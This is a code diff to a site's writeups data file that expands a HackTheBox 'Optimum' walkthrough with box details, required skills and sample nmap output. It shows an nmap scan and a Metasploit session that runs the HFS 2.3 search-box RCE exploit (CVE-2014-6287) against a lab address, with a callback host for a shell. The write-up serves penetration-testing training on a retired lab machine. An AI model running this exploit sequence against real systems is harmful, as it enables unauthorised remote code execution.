@@ -247,8 +247,13 @@ export const writeups: Post[] = [
     ],
     blocks: [
       { kind: 'p', text: 'Optimum is a retired HackTheBox easy Windows machine centered on HttpFileServer (HFS) 2.3. Synopsis: a file-sharing web app with a search-box RCE (CVE-2014-6287), then Sherlock plus MS16-032 for the SYSTEM finish on Server 2012.' },
+      { kind: 'h', text: 'Box info' },
+      { kind: 'p', text: 'OS: Windows Server 2012. Difficulty: easy. Address: 10.10.10.8. Services that matter: HTTP on 80 (HttpFileServer 2.3) — a single-purpose web app is the entire attack surface. Skills exercised: product versioning from the UI, search-input RCE operation, Windows patch-gap enumeration, token-duplication privesc.' },
+      { kind: 'h', text: 'Skills required' },
+      { kind: 'p', text: 'Nmap service enumeration, web product fingerprinting, Metasploit HTTP exploit configuration, Meterpreter process migration, local exploit suggestion workflow.' },
       { kind: 'h', text: 'Enumeration — one product, one version' },
       { kind: 'code', lang: 'bash', title: 'nmap: find the single web service', code: 'nmap -sC -sV -oN optimum.nmap 10.10.10.8' },
+      { kind: 'code', lang: 'text', title: 'nmap: one HTTP service on Windows', code: 'PORT   STATE SERVICE VERSION\n80/tcp open  http    HttpFileServer httpd 2.3\nService Info: OS: Windows' },
       { kind: 'p', text: 'Only HTTP on a Windows Server 2012 fingerprint, and the page title gives away HttpFileServer 2.3. Confirm the version in the interface and note the search box — that input is the CVE-2014-6287 vector, a null-byte-skipping RCE in the search parser.' },
       { kind: 'h', text: 'Exploitation — rejetto_hfs_exec' },
       { kind: 'code', lang: 'bash', title: 'msfconsole: HFS search RCE', code: 'msfconsole -q\nmsf6 > use exploit/windows/http/rejetto_hfs_exec\nmsf6 exploit(rejetto_hfs_exec) > set RHOSTS 10.10.10.8\nmsf6 exploit(rejetto_hfs_exec) > set RPORT 80\nmsf6 exploit(rejetto_hfs_exec) > set LHOST 10.10.14.23\nmsf6 exploit(rejetto_hfs_exec) > run' },
